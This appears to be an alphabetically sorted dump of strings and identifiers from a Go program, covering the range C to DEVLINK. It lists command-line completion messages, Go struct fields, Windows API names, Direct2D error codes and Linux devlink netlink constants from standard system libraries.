CommandLine.Parse(os.Args[1:])
CommandLine.PrintDefaults()
CommandLine.SetInterspersed(interspersed)
CommandLine.Visit(fn)
CommandLine.VisitAll(fn)
CommandLineToArgv(cmd 
Command_set_1  uint16
Command_set_2  uint16
Commands
Command{
Command{}
Comment    
CompErrorln(err.Error())
Compact_count             uint64
Compact_delay_total       uint64
Compat_version uint32
Complete
Completion ended with directive: ShellCompDirectiveDefault
Completion ended with directive: ShellCompDirectiveNoFileComp 
Completion of a flag name does not provide the 
Completion of flag names without the 
CompletionOptions
CompletionOptions CompletionOptions
Compress_cnt    uint64
Compress_tlen   uint64
Compute_shared_secret_cnt uint64
ComputerNameDnsDomain                 = 2
ComputerNameDnsFullyQualified         = 3
ComputerNameDnsHostname               = 1
ComputerNameMax                       = 8
ComputerNameNetBIOS                   = 0
ComputerNamePhysicalDnsDomain         = 6
ComputerNamePhysicalDnsFullyQualified = 7
ComputerNamePhysicalDnsHostname       = 5
ComputerNamePhysicalNetBIOS           = 4
Config             uint64
Config         uint16
ConnId uint32
Conn_id  uint32
Conn_id uint32
ConsoleFlags                                 uint32
ConsoleHandle                                Handle
ConsoleScreenBufferInfo) (err error) = kernel32.GetConsoleScreenBufferInfo
ConsoleScreenBufferInfo) (err error) {
Constant  int32
Constant  int64
Constraint
Constraint) Check(v 
Constraint) Equals(con 
Constraint) String() string {
Constraint) bool {
Constraints
Constraint{
Consumer uint64
ContainingDirectory Handle
Contents_encryption_mode  uint8
Context               uintptr
Context   uint32
ContextTrackingMode byte
ContinueOnError ErrorHandling = iota
Contribution
Contributor
Contributor Version
Control    
Control     WSABuf
Control_regs  [3]uint64
Controllen int32
Controllen uint32
Controllen uint64
ControlsAccepted        uint32
ConvertSidToStringSid(sid 
ConvertStringSidToSid(stringSid 
Cookie interface{}
Cookie uint32
Copyright (c) 2009 The Go Authors. All rights reserved.
Copyright (c) 2011 Keith Rarick
Copyright (c) 2012 Alex Ogier. All rights reserved.
Copyright (c) 2012 The Go Authors. All rights reserved.
Copyright (c) 2021 Liam Galvin
Copyright 2014 Alan Shreve
Core
Coremem                   uint64
Corrected uint32
Count       uint32
Count   uint8
Count  int32
Count uint32
Count uint64
CountExtensions      uint32
CountQualifiers uint32
Covered Software
Cpid       int32
Cpid   int32
Cpu_count                 uint64
Cpu_delay_total           uint64
Cpu_run_real_total        uint64
Cpu_run_virtual_total     uint64
Cpu_scaled_run_real_total uint64
Cr XDPRingOffset
Cr uint32
CreateDirectory(path 
CreateEnvironmentBlock(block 
CreateEvent(eventAttrs 
CreateEventEx(eventAttrs 
CreateFile(name 
CreateHardLink(filename 
CreateJobObject(jobAttr 
CreateMutex(mutexAttrs 
CreateMutexEx(mutexAttrs 
CreateNamedPipe(name 
CreatePipe(readhandle 
CreateProcess(appName 
CreateSymbolicLink(symlinkfilename 
CreateTime                   int64
Creatim   Time_t
Creatim31    [4]byte
CreationTime       Filetime
CreationTime      Filetime
CreationTime   Filetime
CreationTime Filetime
Credential: 
Critical int32
CrlInfo          
CryptAcquireContext(provhandle 
CryptProtectData(dataIn 
CryptUnprotectData(dataIn 
Crypt_name       [64]uint8
CryptoPolicy     
Cs       uint64
Cs     int64
Cs     uint32
CsdVersion        [128]uint16
Csf_default    uint16
Csfo           uint16
Cstamp   uint32
Cstime int32
Cstime int64
Cstime uint32
Ctim           Timespec
Ctim      Time_t
Ctim     Timespec
Ctim    Timespec
Ctim Timespec
Ctim31       [4]byte
Ctime           StatxTimestamp
Ctime      uint32
Ctime  int64
Ctime_high uint16
Ctime_high uint32
Ctime_nsec uint32
Ctimemsec int32
CtlInfo) error {
Ctr       uint32
Ctr       uint64
Ctrl    int32
Cuid uint32
Cur int64
Cur uint32
Cur uint64
Cur1  int32 //32bit pointer
Cur2  int32 //
CurAPMvalues   uint16
CurDirRef           
Cur_capacity0  uint16
Cur_capacity1  uint16
Cur_cyls       uint16
Cur_heads      uint16
Cur_sectors    uint16
CurrentDirectories                               [32]RTL_DRIVE_LETTER_CURDIR
CurrentDirectory CURDIR
CurrentIpAddress    
CurrentState            uint32
Current_mode    int32
CursorPosition    Coord
Cutime int32
Cutime int64
Cutime uint32
Cwm   uint16
CycleTime                    uint64
Cylinders uint16
Cyls           uint16
D2DERR_BAD_NUMBER                                                         Handle        = 0x88990011
D2DERR_BITMAP_BOUND_AS_TARGET                                             Handle        = 0x88990025
D2DERR_BITMAP_CANNOT_DRAW                                                 Handle        = 0x88990021
D2DERR_CYCLIC_GRAPH                                                       Handle        = 0x88990020
D2DERR_DISPLAY_FORMAT_NOT_SUPPORTED                                       Handle        = 0x88990009
D2DERR_DISPLAY_STATE_INVALID                                              Handle        = 0x88990006
D2DERR_EFFECT_IS_NOT_REGISTERED                                           Handle        = 0x88990028
D2DERR_EXCEEDS_MAX_BITMAP_SIZE                                            Handle        = 0x8899001D
D2DERR_INCOMPATIBLE_BRUSH_TYPES                                           Handle        = 0x88990018
D2DERR_INSUFFICIENT_DEVICE_CAPABILITIES                                   Handle        = 0x88990026
D2DERR_INTERMEDIATE_TOO_LARGE                                             Handle        = 0x88990027
D2DERR_INTERNAL_ERROR                                                     Handle        = 0x88990008
D2DERR_INVALID_CALL                                                       Handle        = 0x8899000A
D2DERR_INVALID_GLYPH_IMAGE                                                Handle        = 0x8899002E
D2DERR_INVALID_GRAPH_CONFIGURATION                                        Handle        = 0x8899001E
D2DERR_INVALID_INTERNAL_GRAPH_CONFIGURATION                               Handle        = 0x8899001F
D2DERR_INVALID_PROPERTY                                                   Handle        = 0x88990029
D2DERR_INVALID_TARGET                                                     Handle        = 0x88990024
D2DERR_LAYER_ALREADY_IN_USE                                               Handle        = 0x88990013
D2DERR_MAX_TEXTURE_SIZE_EXCEEDED                                          Handle        = 0x8899000F
D2DERR_NOT_INITIALIZED                                                    Handle        = 0x88990002
D2DERR_NO_HARDWARE_DEVICE                                                 Handle        = 0x8899000B
D2DERR_NO_SUBPROPERTIES                                                   Handle        = 0x8899002A
D2DERR_ORIGINAL_TARGET_NOT_BOUND                                          Handle        = 0x88990023
D2DERR_OUTSTANDING_BITMAP_REFERENCES                                      Handle        = 0x88990022
D2DERR_POP_CALL_DID_NOT_MATCH_PUSH                                        Handle        = 0x88990014
D2DERR_PRINT_FORMAT_NOT_SUPPORTED                                         Handle        = 0x8899002C
D2DERR_PRINT_JOB_CLOSED                                                   Handle        = 0x8899002B
D2DERR_PUSH_POP_UNBALANCED                                                Handle        = 0x88990016
D2DERR_RECREATE_TARGET                                                    Handle        = 0x8899000C
D2DERR_RENDER_TARGET_HAS_LAYER_OR_CLIPRECT                                Handle        = 0x88990017
D2DERR_SCANNER_FAILED                                                     Handle        = 0x88990004
D2DERR_SCREEN_ACCESS_DENIED                                               Handle        = 0x88990005
D2DERR_SHADER_COMPILE_FAILED                                              Handle        = 0x8899000E
D2DERR_TARGET_NOT_GDI_COMPATIBLE                                          Handle        = 0x8899001A
D2DERR_TEXT_EFFECT_IS_WRONG_TYPE                                          Handle        = 0x8899001B
D2DERR_TEXT_RENDERER_NOT_RELEASED                                         Handle        = 0x8899001C
D2DERR_TOO_MANY_SHADER_ELEMENTS                                           Handle        = 0x8899000D
D2DERR_TOO_MANY_TRANSFORM_INPUTS                                          Handle        = 0x8899002D
D2DERR_UNSUPPORTED_OPERATION                                              Handle        = 0x88990003
D2DERR_UNSUPPORTED_VERSION                                                Handle        = 0x88990010
D2DERR_WIN32_ERROR                                                        Handle        = 0x88990019
D2DERR_WRONG_FACTORY                                                      Handle        = 0x88990012
D2DERR_WRONG_RESOURCE_DOMAIN                                              Handle        = 0x88990015
D2DERR_WRONG_STATE                                                        Handle        = 0x88990001
D2DERR_ZERO_VECTOR                                                        Handle        = 0x88990007
D3D10_ERROR_FILE_NOT_FOUND                                                Handle        = 0x88790002
D3D10_ERROR_TOO_MANY_UNIQUE_STATE_OBJECTS                                 Handle        = 0x88790001
D3D11_ERROR_DEFERRED_CONTEXT_MAP_WITHOUT_INITIAL_DISCARD                  Handle        = 0x887C0004
D3D11_ERROR_FILE_NOT_FOUND                                                Handle        = 0x887C0002
D3D11_ERROR_TOO_MANY_UNIQUE_STATE_OBJECTS                                 Handle        = 0x887C0001
D3D11_ERROR_TOO_MANY_UNIQUE_VIEW_OBJECTS                                  Handle        = 0x887C0003
D3D12_ERROR_ADAPTER_NOT_FOUND                                             Handle        = 0x887E0001
D3D12_ERROR_DRIVER_VERSION_MISMATCH                                       Handle        = 0x887E0002
DACL_SECURITY_INFORMATION             = 0x00000004
DATA
DATA)/ 
DATA_E_FIRST                                                              syscall.Errno = 0x80040130
DATA_E_LAST                                                               syscall.Errno = 0x8004013F
DATA_S_FIRST                                                              syscall.Errno = 0x00040130
DATA_S_LAST                                                               syscall.Errno = 0x0004013F
DATA_S_SAMEFORMATETC                                                      Handle        = 0x00040130
DAXFS_MAGIC                                 = 0x64646178
DCOMPOSITION_ERROR_SURFACE_BEING_RENDERED                                 Handle        = 0x88980801
DCOMPOSITION_ERROR_SURFACE_NOT_BEING_RENDERED                             Handle        = 0x88980802
DCOMPOSITION_ERROR_WINDOW_ALREADY_COMPOSED                                Handle        = 0x88980800
DDD_EXACT_MATCH_ON_REMOVE = 0x00000004
DDD_NO_BROADCAST_SYSTEM   = 0x00000008
DDD_RAW_TARGET_PATH       = 0x00000001
DDD_REMOVE_DEFINITION     = 0x00000002
DEBUGFS_MAGIC                               = 0x64626720
DEBUG_ONLY_THIS_PROCESS          = 0x00000002
DEBUG_PROCESS                    = 0x00000001
DEDUPERANGE)/ 
DELETE                   = 0x00010000
DENY_ACCESS       = 3
DETACH)/ 
DETACHED_PROCESS                 = 0x00000008
DEVLINK_/ 
DEVLINK_ATTR_BUS_NAME                              = 0x1
DEVLINK_ATTR_DEV_NAME                              = 0x2
DEVLINK_ATTR_DEV_STATS                             = 0x9c
DEVLINK_ATTR_DPIPE_ACTION                          = 0x2b
DEVLINK_ATTR_DPIPE_ACTION_TYPE                     = 0x2d
DEVLINK_ATTR_DPIPE_ACTION_VALUE                    = 0x2c
DEVLINK_ATTR_DPIPE_ENTRIES                         = 0x22
DEVLINK_ATTR_DPIPE_ENTRY                           = 0x23
DEVLINK_ATTR_DPIPE_ENTRY_ACTION_VALUES             = 0x26
DEVLINK_ATTR_DPIPE_ENTRY_COUNTER                   = 0x27
DEVLINK_ATTR_DPIPE_ENTRY_INDEX                     = 0x24
DEVLINK_ATTR_DPIPE_ENTRY_MATCH_VALUES              = 0x25
DEVLINK_ATTR_DPIPE_FIELD                           = 0x38
DEVLINK_ATTR_DPIPE_FIELD_BITWIDTH                  = 0x3b
DEVLINK_ATTR_DPIPE_FIELD_ID                        = 0x3a
DEVLINK_ATTR_DPIPE_FIELD_MAPPING_TYPE              = 0x3c
DEVLINK_ATTR_DPIPE_FIELD_NAME                      = 0x39
DEVLINK_ATTR_DPIPE_HEADER                          = 0x32
DEVLINK_ATTR_DPIPE_HEADERS                         = 0x31
DEVLINK_ATTR_DPIPE_HEADER_FIELDS                   = 0x35
DEVLINK_ATTR_DPIPE_HEADER_GLOBAL                   = 0x36
DEVLINK_ATTR_DPIPE_HEADER_ID                       = 0x34
DEVLINK_ATTR_DPIPE_HEADER_INDEX                    = 0x37
DEVLINK_ATTR_DPIPE_HEADER_NAME                     = 0x33
DEVLINK_ATTR_DPIPE_MATCH                           = 0x28
DEVLINK_ATTR_DPIPE_MATCH_TYPE                      = 0x2a
DEVLINK_ATTR_DPIPE_MATCH_VALUE                     = 0x29
DEVLINK_ATTR_DPIPE_TABLE                           = 0x1c
DEVLINK_ATTR_DPIPE_TABLES                          = 0x1b
DEVLINK_ATTR_DPIPE_TABLE_ACTIONS                   = 0x20
DEVLINK_ATTR_DPIPE_TABLE_COUNTERS_ENABLED          = 0x21
DEVLINK_ATTR_DPIPE_TABLE_MATCHES                   = 0x1f
DEVLINK_ATTR_DPIPE_TABLE_NAME                      = 0x1d
DEVLINK_ATTR_DPIPE_TABLE_RESOURCE_ID               = 0x4b
DEVLINK_ATTR_DPIPE_TABLE_RESOURCE_UNITS            = 0x4c
DEVLINK_ATTR_DPIPE_TABLE_SIZE                      = 0x1e
DEVLINK_ATTR_DPIPE_VALUE                           = 0x2e
DEVLINK_ATTR_DPIPE_VALUE_MAPPING                   = 0x30
DEVLINK_ATTR_DPIPE_VALUE_MASK                      = 0x2f
DEVLINK_ATTR_ESWITCH_ENCAP_MODE                    = 0x3e
DEVLINK_ATTR_ESWITCH_INLINE_MODE                   = 0x1a
DEVLINK_ATTR_ESWITCH_MODE                          = 0x19
DEVLINK_ATTR_FLASH_UPDATE_COMPONENT                = 0x7b
DEVLINK_ATTR_FLASH_UPDATE_FILE_NAME                = 0x7a
DEVLINK_ATTR_FLASH_UPDATE_OVERWRITE_MASK           = 0x98
DEVLINK_ATTR_FLASH_UPDATE_STATUS_DONE              = 0x7d
DEVLINK_ATTR_FLASH_UPDATE_STATUS_MSG               = 0x7c
DEVLINK_ATTR_FLASH_UPDATE_STATUS_TIMEOUT           = 0x97
DEVLINK_ATTR_FLASH_UPDATE_STATUS_TOTAL             = 0x7e
DEVLINK_ATTR_FMSG                                  = 0x6a
DEVLINK_ATTR_FMSG_ARR_NEST_START                   = 0x6d
DEVLINK_ATTR_FMSG_NEST_END                         = 0x6e
DEVLINK_ATTR_FMSG_OBJ_NAME                         = 0x6f
DEVLINK_ATTR_FMSG_OBJ_NEST_START                   = 0x6b
DEVLINK_ATTR_FMSG_OBJ_VALUE_DATA                   = 0x71
DEVLINK_ATTR_FMSG_OBJ_VALUE_TYPE                   = 0x70
DEVLINK_ATTR_FMSG_PAIR_NEST_START                  = 0x6c
DEVLINK_ATTR_HEALTH_REPORTER                       = 0x72
DEVLINK_ATTR_HEALTH_REPORTER_AUTO_DUMP             = 0x8d
DEVLINK_ATTR_HEALTH_REPORTER_AUTO_RECOVER          = 0x79
DEVLINK_ATTR_HEALTH_REPORTER_DUMP_TS               = 0x77
DEVLINK_ATTR_HEALTH_REPORTER_DUMP_TS_NS            = 0x89
DEVLINK_ATTR_HEALTH_REPORTER_ERR_COUNT             = 0x75
DEVLINK_ATTR_HEALTH_REPORTER_GRACEFUL_PERIOD       = 0x78
DEVLINK_ATTR_HEALTH_REPORTER_NAME                  = 0x73
DEVLINK_ATTR_HEALTH_REPORTER_RECOVER_COUNT         = 0x76
DEVLINK_ATTR_HEALTH_REPORTER_STATE                 = 0x74
DEVLINK_ATTR_INFO_BOARD_SERIAL_NUMBER              = 0x92
DEVLINK_ATTR_INFO_DRIVER_NAME                      = 0x62
DEVLINK_ATTR_INFO_SERIAL_NUMBER                    = 0x63
DEVLINK_ATTR_INFO_VERSION_FIXED                    = 0x64
DEVLINK_ATTR_INFO_VERSION_NAME                     = 0x67
DEVLINK_ATTR_INFO_VERSION_RUNNING                  = 0x65
DEVLINK_ATTR_INFO_VERSION_STORED                   = 0x66
DEVLINK_ATTR_INFO_VERSION_VALUE                    = 0x68
DEVLINK_ATTR_MAX                                   = 0xae
DEVLINK_ATTR_NETNS_FD                              = 0x8a
DEVLINK_ATTR_NETNS_ID                              = 0x8c
DEVLINK_ATTR_NETNS_PID                             = 0x8b
DEVLINK_ATTR_PAD                                   = 0x3d
DEVLINK_ATTR_PARAM                                 = 0x50
DEVLINK_ATTR_PARAM_GENERIC                         = 0x52
DEVLINK_ATTR_PARAM_NAME                            = 0x51
DEVLINK_ATTR_PARAM_TYPE                            = 0x53
DEVLINK_ATTR_PARAM_VALUE                           = 0x55
DEVLINK_ATTR_PARAM_VALUES_LIST                     = 0x54
DEVLINK_ATTR_PARAM_VALUE_CMODE                     = 0x57
DEVLINK_ATTR_PARAM_VALUE_DATA                      = 0x56
DEVLINK_ATTR_PORT_CONTROLLER_NUMBER                = 0x96
DEVLINK_ATTR_PORT_DESIRED_TYPE                     = 0x5
DEVLINK_ATTR_PORT_EXTERNAL                         = 0x95
DEVLINK_ATTR_PORT_FLAVOUR                          = 0x4d
DEVLINK_ATTR_PORT_FUNCTION                         = 0x91
DEVLINK_ATTR_PORT_IBDEV_NAME                       = 0x8
DEVLINK_ATTR_PORT_INDEX                            = 0x3
DEVLINK_ATTR_PORT_LANES                            = 0x93
DEVLINK_ATTR_PORT_NETDEV_IFINDEX                   = 0x6
DEVLINK_ATTR_PORT_NETDEV_NAME                      = 0x7
DEVLINK_ATTR_PORT_NUMBER                           = 0x4e
DEVLINK_ATTR_PORT_PCI_PF_NUMBER                    = 0x7f
DEVLINK_ATTR_PORT_PCI_SF_NUMBER                    = 0xa4
DEVLINK_ATTR_PORT_PCI_VF_NUMBER                    = 0x80
DEVLINK_ATTR_PORT_SPLITTABLE                       = 0x94
DEVLINK_ATTR_PORT_SPLIT_COUNT                      = 0x9
DEVLINK_ATTR_PORT_SPLIT_GROUP                      = 0xa
DEVLINK_ATTR_PORT_SPLIT_SUBPORT_NUMBER             = 0x4f
DEVLINK_ATTR_PORT_TYPE                             = 0x4
DEVLINK_ATTR_RATE_NODE_NAME                        = 0xa8
DEVLINK_ATTR_RATE_PARENT_NODE_NAME                 = 0xa9
DEVLINK_ATTR_RATE_TX_MAX                           = 0xa7
DEVLINK_ATTR_RATE_TX_SHARE                         = 0xa6
DEVLINK_ATTR_RATE_TYPE                             = 0xa5
DEVLINK_ATTR_REGION_CHUNK                          = 0x5e
DEVLINK_ATTR_REGION_CHUNKS                         = 0x5d
DEVLINK_ATTR_REGION_CHUNK_ADDR                     = 0x60
DEVLINK_ATTR_REGION_CHUNK_DATA                     = 0x5f
DEVLINK_ATTR_REGION_CHUNK_LEN                      = 0x61
DEVLINK_ATTR_REGION_MAX_SNAPSHOTS                  = 0xaa
DEVLINK_ATTR_REGION_NAME                           = 0x58
DEVLINK_ATTR_REGION_SIZE                           = 0x59
DEVLINK_ATTR_REGION_SNAPSHOT                       = 0x5b
DEVLINK_ATTR_REGION_SNAPSHOTS                      = 0x5a
DEVLINK_ATTR_REGION_SNAPSHOT_ID                    = 0x5c
DEVLINK_ATTR_RELOAD_ACTION                         = 0x99
DEVLINK_ATTR_RELOAD_ACTIONS_PERFORMED              = 0x9a
DEVLINK_ATTR_RELOAD_ACTION_INFO                    = 0xa2
DEVLINK_ATTR_RELOAD_ACTION_STATS                   = 0xa3
DEVLINK_ATTR_RELOAD_FAILED                         = 0x88
DEVLINK_ATTR_RELOAD_LIMITS                         = 0x9b
DEVLINK_ATTR_RELOAD_STATS                          = 0x9d
DEVLINK_ATTR_RELOAD_STATS_ENTRY                    = 0x9e
DEVLINK_ATTR_RELOAD_STATS_LIMIT                    = 0x9f
DEVLINK_ATTR_RELOAD_STATS_VALUE                    = 0xa0
DEVLINK_ATTR_REMOTE_RELOAD_STATS                   = 0xa1
DEVLINK_ATTR_RESOURCE                              = 0x40
DEVLINK_ATTR_RESOURCE_ID                           = 0x42
DEVLINK_ATTR_RESOURCE_LIST                         = 0x3f
DEVLINK_ATTR_RESOURCE_NAME                         = 0x41
DEVLINK_ATTR_RESOURCE_OCC                          = 0x4a
DEVLINK_ATTR_RESOURCE_SIZE                         = 0x43
DEVLINK_ATTR_RESOURCE_SIZE_GRAN                    = 0x48
DEVLINK_ATTR_RESOURCE_SIZE_MAX                     = 0x47
DEVLINK_ATTR_RESOURCE_SIZE_MIN                     = 0x46
DEVLINK_ATTR_RESOURCE_SIZE_NEW                     = 0x44
DEVLINK_ATTR_RESOURCE_SIZE_VALID                   = 0x45
DEVLINK_ATTR_RESOURCE_UNIT                         = 0x49
DEVLINK_ATTR_SB_EGRESS_POOL_COUNT                  = 0xe
DEVLINK_ATTR_SB_EGRESS_TC_COUNT                    = 0x10
DEVLINK_ATTR_SB_INDEX                              = 0xb
DEVLINK_ATTR_SB_INGRESS_POOL_COUNT                 = 0xd
DEVLINK_ATTR_SB_INGRESS_TC_COUNT                   = 0xf
DEVLINK_ATTR_SB_OCC_CUR                            = 0x17
DEVLINK_ATTR_SB_OCC_MAX                            = 0x18
DEVLINK_ATTR_SB_POOL_CELL_SIZE                     = 0x69
DEVLINK_ATTR_SB_POOL_INDEX                         = 0x11
DEVLINK_ATTR_SB_POOL_SIZE                          = 0x13
DEVLINK_ATTR_SB_POOL_THRESHOLD_TYPE                = 0x14
DEVLINK_ATTR_SB_POOL_TYPE                          = 0x12
DEVLINK_ATTR_SB_SIZE                               = 0xc
DEVLINK_ATTR_SB_TC_INDEX                           = 0x16
DEVLINK_ATTR_SB_THRESHOLD                          = 0x15
DEVLINK_ATTR_STATS                                 = 0x81
DEVLINK_ATTR_STATS_MAX                             = 0x2
DEVLINK_ATTR_STATS_RX_BYTES                        = 0x1
DEVLINK_ATTR_STATS_RX_DROPPED                      = 0x2
DEVLINK_ATTR_STATS_RX_PACKETS                      = 0x0
DEVLINK_ATTR_TRAP_ACTION                           = 0x83
DEVLINK_ATTR_TRAP_GENERIC                          = 0x85
DEVLINK_ATTR_TRAP_GROUP_NAME                       = 0x87
DEVLINK_ATTR_TRAP_METADATA                         = 0x86
DEVLINK_ATTR_TRAP_METADATA_TYPE_FA_COOKIE          = 0x1
DEVLINK_ATTR_TRAP_METADATA_TYPE_IN_PORT            = 0x0
DEVLINK_ATTR_TRAP_NAME                             = 0x82
DEVLINK_ATTR_TRAP_POLICER_BURST                    = 0x90
DEVLINK_ATTR_TRAP_POLICER_ID                       = 0x8e
DEVLINK_ATTR_TRAP_POLICER_RATE                     = 0x8f
DEVLINK_ATTR_TRAP_TYPE                             = 0x84
DEVLINK_ATTR_UNSPEC                                = 0x0
DEVLINK_CMD_DEL                                    = 0x4
DEVLINK_CMD_DPIPE_ENTRIES_GET                      = 0x20
DEVLINK_CMD_DPIPE_HEADERS_GET                      = 0x21
DEVLINK_CMD_DPIPE_TABLE_COUNTERS_SET               = 0x22
DEVLINK_CMD_DPIPE_TABLE_GET                        = 0x1f
DEVLINK_CMD_ESWITCH_GET                            = 0x1d
DEVLINK_CMD_ESWITCH_MODE_GET                = 0x1d
DEVLINK_CMD_ESWITCH_MODE_SET                = 0x1e
DEVLINK_CMD_ESWITCH_SET                            = 0x1e
DEVLINK_CMD_FLASH_UPDATE                           = 0x3a
DEVLINK_CMD_FLASH_UPDATE_END                       = 0x3b
DEVLINK_CMD_FLASH_UPDATE_STATUS                    = 0x3c
DEVLINK_CMD_GET                                    = 0x1
DEVLINK_CMD_HEALTH_REPORTER_DIAGNOSE               = 0x37
DEVLINK_CMD_HEALTH_REPORTER_DUMP_CLEAR             = 0x39
DEVLINK_CMD_HEALTH_REPORTER_DUMP_GET               = 0x38
DEVLINK_CMD_HEALTH_REPORTER_GET                    = 0x34
DEVLINK_CMD_HEALTH_REPORTER_RECOVER                = 0x36
DEVLINK_CMD_HEALTH_REPORTER_SET                    = 0x35
DEVLINK_CMD_HEALTH_REPORTER_TEST                   = 0x49
DEVLINK_CMD_INFO_GET                               = 0x33
DEVLINK_CMD_MAX                                    = 0x51
DEVLINK_CMD_NEW                                    = 0x3
DEVLINK_CMD_PARAM_DEL                              = 0x29
DEVLINK_CMD_PARAM_GET                              = 0x26
DEVLINK_CMD_PARAM_NEW                              = 0x28
DEVLINK_CMD_PARAM_SET                              = 0x27
DEVLINK_CMD_PORT_DEL                               = 0x8
DEVLINK_CMD_PORT_GET                               = 0x5
DEVLINK_CMD_PORT_NEW                               = 0x7
DEVLINK_CMD_PORT_PARAM_DEL                         = 0x32
DEVLINK_CMD_PORT_PARAM_GET                         = 0x2f
DEVLINK_CMD_PORT_PARAM_NEW                         = 0x31
DEVLINK_CMD_PORT_PARAM_SET                         = 0x30
DEVLINK_CMD_PORT_SET                               = 0x6
DEVLINK_CMD_PORT_SPLIT                             = 0x9
DEVLINK_CMD_PORT_UNSPLIT                           = 0xa
DEVLINK_CMD_REGION_DEL                             = 0x2d
DEVLINK_CMD_REGION_GET                             = 0x2a
DEVLINK_CMD_REGION_NEW                             = 0x2c
DEVLINK_CMD_REGION_READ                            = 0x2e
DEVLINK_CMD_REGION_SET                             = 0x2b
DEVLINK_CMD_RELOAD                                 = 0x25
DEVLINK_CMD_RESOURCE_DUMP                          = 0x24
DEVLINK_CMD_RESOURCE_SET                           = 0x23
DEVLINK_CMD_SB_DEL                                 = 0xe
DEVLINK_CMD_SB_GET                                 = 0xb
DEVLINK_CMD_SB_NEW                                 = 0xd
DEVLINK_CMD_SB_OCC_MAX_CLEAR                       = 0x1c
DEVLINK_CMD_SB_OCC_SNAPSHOT                        = 0x1b
DEVLINK_CMD_SB_POOL_DEL                            = 0x12
DEVLINK_CMD_SB_POOL_GET                            = 0xf
DEVLINK_CMD_SB_POOL_NEW                            = 0x11
DEVLINK_CMD_SB_POOL_SET                            = 0x10
DEVLINK_CMD_SB_PORT_POOL_DEL                       = 0x16
DEVLINK_CMD_SB_PORT_POOL_GET                       = 0x13
DEVLINK_CMD_SB_PORT_POOL_NEW                       = 0x15
DEVLINK_CMD_SB_PORT_POOL_SET                       = 0x14
DEVLINK_CMD_SB_SET                                 = 0xc
DEVLINK_CMD_SB_TC_POOL_BIND_DEL                    = 0x1a
DEVLINK_CMD_SB_TC_POOL_BIND_GET                    = 0x17
DEVLINK_CMD_SB_TC_POOL_BIND_NEW                    = 0x19
DEVLINK_CMD_SB_TC_POOL_BIND_SET                    = 0x18
DEVLINK_CMD_SET                                    = 0x2
DEVLINK_CMD_TRAP_DEL                               = 0x40
DEVLINK_CMD_TRAP_GET                               = 0x3d
DEVLINK_CMD_TRAP_GROUP_DEL                         = 0x44
DEVLINK_CMD_TRAP_GROUP_GET                         = 0x41
DEVLINK_CMD_TRAP_GROUP_NEW                         = 0x43
DEVLINK_CMD_TRAP_GROUP_SET                         = 0x42
DEVLINK_CMD_TRAP_NEW                               = 0x3f
DEVLINK_CMD_TRAP_POLICER_DEL                       = 0x48
DEVLINK_CMD_TRAP_POLICER_GET                       = 0x45
DEVLINK_CMD_TRAP_POLICER_NEW                       = 0x47
DEVLINK_CMD_TRAP_POLICER_SET                       = 0x46
DEVLINK_CMD_TRAP_SET                               = 0x3e
DEVLINK_CMD_UNSPEC                                 = 0x0
DEVLINK_DPIPE_ACTION_TYPE_FIELD_MODIFY             = 0x0
DEVLINK_DPIPE_FIELD_ETHERNET_DST_MAC               = 0x0
DEVLINK_DPIPE_FIELD_IPV4_DST_IP                    = 0x0
DEVLINK_DPIPE_FIELD_IPV6_DST_IP                    = 0x0
DEVLINK_DPIPE_FIELD_MAPPING_TYPE_IFINDEX           = 0x1
DEVLINK_DPIPE_FIELD_MAPPING_TYPE_NONE              = 0x0
DEVLINK_DPIPE_HEADER_ETHERNET                      = 0x0
DEVLINK_DPIPE_HEADER_IPV4                          = 0x1
DEVLINK_DPIPE_HEADER_IPV6                          = 0x2
DEVLINK_DPIPE_MATCH_TYPE_FIELD_EXACT               = 0x0
DEVLINK_ESWITCH_ENCAP_MODE_BASIC                   = 0x1
DEVLINK_ESWITCH_ENCAP_MODE_NONE                    = 0x0
DEVLINK_ESWITCH_INLINE_MODE_LINK                   = 0x1
DEVLINK_ESWITCH_INLINE_MODE_NETWORK                = 0x2
DEVLINK_ESWITCH_INLINE_MODE_NONE                   = 0x0
DEVLINK_ESWITCH_INLINE_MODE_TRANSPORT              = 0x3
DEVLINK_ESWITCH_MODE_LEGACY                        = 0x0
DEVLINK_ESWITCH_MODE_SWITCHDEV                     = 0x1
DEVLINK_FLASH_OVERWRITE_IDENTIFIERS         = 0x2
DEVLINK_FLASH_OVERWRITE_IDENTIFIERS_BIT            = 0x1
DEVLINK_FLASH_OVERWRITE_MAX_BIT                    = 0x1
DEVLINK_FLASH_OVERWRITE_SETTINGS            = 0x1
DEVLINK_FLASH_OVERWRITE_SETTINGS_BIT               = 0x0
DEVLINK_GENL_VERSION                        = 0x1
DEVLINK_PARAM_CMODE_DRIVERINIT                     = 0x1
DEVLINK_PARAM_CMODE_MAX                            = 0x2
DEVLINK_PARAM_CMODE_PERMANENT                      = 0x2
DEVLINK_PARAM_CMODE_RUNTIME                        = 0x0
DEVLINK_PARAM_FW_LOAD_POLICY_VALUE_DISK            = 0x2
DEVLINK_PARAM_FW_LOAD_POLICY_VALUE_DRIVER          = 0x0
DEVLINK_PARAM_FW_LOAD_POLICY_VALUE_FLASH           = 0x1
DEVLINK_PARAM_FW_LOAD_POLICY_VALUE_UNKNOWN         = 0x3
DEVLINK_PARAM_RESET_DEV_ON_DRV_PROBE_VALUE_ALWAYS  = 0x1
DEVLINK_PARAM_RESET_DEV_ON_DRV_PROBE_VALUE_DISK    = 0x3
DEVLINK_PARAM_RESET_DEV_ON_DRV_PROBE_VALUE_NEVER   = 0x2
DEVLINK_PARAM_RESET_DEV_ON_DRV_PROBE_VALUE_UNKNOWN = 0x0
DEVLINK_PORT_FLAVOUR_CPU                           = 0x1
DEVLINK_PORT_FLAVOUR_DSA                           = 0x2
DEVLINK_PORT_FLAVOUR_PCI_PF                        = 0x3
DEVLINK_PORT_FLAVOUR_PCI_VF                        = 0x4
DEVLINK_PORT_FLAVOUR_PHYSICAL                      = 0x0
DEVLINK_PORT_FLAVOUR_UNUSED                        = 0x6
DEVLINK_PORT_FLAVOUR_VIRTUAL                       = 0x5
DEVLINK_PORT_FN_ATTR_OPSTATE                       = 0x3
DEVLINK_PORT_FN_ATTR_STATE                         = 0x2
DEVLINK_PORT_FUNCTION_ATTR_HW_ADDR                 = 0x1
DEVLINK_PORT_FUNCTION_ATTR_MAX                     = 0x3
DEVLINK_PORT_FUNCTION_ATTR_UNSPEC                  = 0x0
DEVLINK_PORT_TYPE_AUTO                             = 0x1
DEVLINK_PORT_TYPE_ETH                              = 0x2
DEVLINK_PORT_TYPE_IB                               = 0x3
DEVLINK_PORT_TYPE_NOTSET                           = 0x0
